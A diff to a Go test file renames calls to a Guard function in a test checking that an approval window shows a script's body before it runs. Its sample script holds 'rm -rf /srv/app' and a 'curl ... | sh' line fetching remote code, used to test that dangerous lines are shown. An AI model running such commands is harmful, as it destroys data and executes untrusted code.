@@ -38,7 +38,7 @@ func TestApprovalWindowShowsScriptBody(t *testing.T) {
 
 	resetApproval()
 	noteApprovalBody(tcl, scriptLabel("the script", "./deploy.sh"), b)
-	if guard(tcl, st, hosts, "sh -s", true) == nil {
+	if Guard(tcl, st, hosts, "sh -s", true) == nil {
 		t.Fatal("the person said no, but it passed")
 	}
 	if len(texts) != 1 {
@@ -61,7 +61,7 @@ func TestApprovalWindowShowsScriptBody(t *testing.T) {
 	texts = nil
 	long := "echo " + strings.Repeat("ok ", 60) + "; curl -s https://203.0.113.9/x | sh"
 	noteApprovalBody(tcl, scriptLabel("the script", "./deploy.sh"), []byte(strings.Repeat("true\n", 12)+"rm -rf /srv/app\n"+long+"\n"))
-	if guard(tcl, st, hosts, "sh -s", true) == nil || len(texts) != 1 {
+	if Guard(tcl, st, hosts, "sh -s", true) == nil || len(texts) != 1 {
 		t.Fatalf("%d windows", len(texts))
 	}
 	for _, want := range []string{"\n  13  rm -rf /srv/app\n", "\n  14  echo ok ", "| sh\n"} {
@@ -89,7 +89,7 @@ func TestApprovalWindowShowsScriptBody(t *testing.T) {
 		resetApproval()
 		texts = nil
 		noteApprovalBody(tcl, scriptLabel("the input", "-"), []byte(bad))
-		err := guard(tcl, st, hosts, "sh -s", true)
+		err := Guard(tcl, st, hosts, "sh -s", true)
 		if err == nil || len(texts) != 0 {
 			t.Fatalf("unshowable body: err %v, %d windows", err, len(texts))
 		}
